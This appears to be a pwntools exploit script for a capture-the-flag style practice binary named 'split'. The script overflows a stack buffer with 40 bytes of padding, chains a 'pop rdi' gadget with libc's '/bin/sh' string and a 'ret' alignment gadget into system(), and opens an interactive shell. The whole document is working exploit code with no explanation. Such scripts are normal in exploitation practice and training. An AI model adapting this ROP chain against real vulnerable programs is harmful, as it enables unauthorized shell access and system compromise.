from pwn import *
elf = context.binary = ELF("./split")
p = process()
libc = elf.libc
libc.address = 0x00007ffff7dcb000

junk = 40

system = p64(libc.sym["system"])
param_bash = p64(next(libc.search(b"/bin/sh")))
rop = ROP(elf)
rdi = p64(rop.find_gadget(["pop rdi"])[0])
aligment = p64(rop.find_gadget(["ret"])[0])
payload = b"A" * junk + rdi + param_bash + aligment + system + p64(0x0)
write("payload",payload)
p.sendline(payload)
p.interactive()